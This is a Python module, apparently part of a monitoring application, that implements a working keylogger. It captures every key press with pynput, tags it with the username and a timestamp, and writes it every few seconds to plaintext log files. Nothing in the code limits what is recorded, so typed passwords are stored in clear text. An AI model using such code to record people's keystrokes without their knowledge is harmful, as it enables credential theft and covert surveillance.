from __future__ import annotations

import os
import threading
import time
from datetime import datetime

from pynput import keyboard

from ..database import db

SPECIAL_KEYS = {
    keyboard.Key.enter: "[ENTER]",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.space: " ",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPSLOCK]",
    keyboard.Key.cmd: "[WIN]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.page_up: "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
    keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]", keyboard.Key.f3: "[F3]",
    keyboard.Key.f4: "[F4]", keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
    keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]", keyboard.Key.f9: "[F9]",
    keyboard.Key.f10: "[F10]", keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}


class KeyLogger:
    def __init__(self):
        self._running = False
        self._user_id: int | None = None
        self._username: str = ""
        self._filepath: str = ""
        self._listener: keyboard.Listener | None = None
        self._lock = threading.Lock()
        self._buffer: list[str] = []
        self._flush_timer: threading.Thread | None = None

    def start(self, user_id: int, username: str):
        self._user_id = user_id
        self._username = username

        today = datetime.now().strftime("%Y%m%d")
        per_session = db.get_config("keylogger_per_session", "1") == "1"
        if per_session:
            timestamp = datetime.now().strftime("%H%M%S")
            filename = f"keylog_{today}_{timestamp}_{username}.txt"
        else:
            filename = f"keylog_{today}_{username}.txt"

        folder = db.get_config("keylogger_path", os.path.join(os.path.dirname(db.DB_PATH), "keylogs"))
        os.makedirs(folder, exist_ok=True)
        self._filepath = os.path.join(folder, filename)

        self._running = True
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()

        self._flush_timer = threading.Thread(target=self._flush_periodically, daemon=True)
        self._flush_timer.start()

        db.insert_log(self._user_id, "keylogger_start", description=f"Início do keylog: {self._filepath}")

    def stop(self):
        self._running = False
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._flush_buffer()
        db.insert_log(self._user_id, "keylogger_stop", description="Keylog encerrado")

    def _on_press(self, key):
        if not self._running:
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            char = key.char
        except AttributeError:
            char = SPECIAL_KEYS.get(key, f"[{str(key)}]")

        with self._lock:
            self._buffer.append(f"[{timestamp}] {self._username}: {char}")

    def _flush_buffer(self):
        with self._lock:
            if not self._buffer:
                return
            lines = self._buffer
            self._buffer = []
        try:
            with open(self._filepath, "a", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
        except Exception:
            pass

    def _flush_periodically(self):
        while self._running:
            time.sleep(5)
            self._flush_buffer()
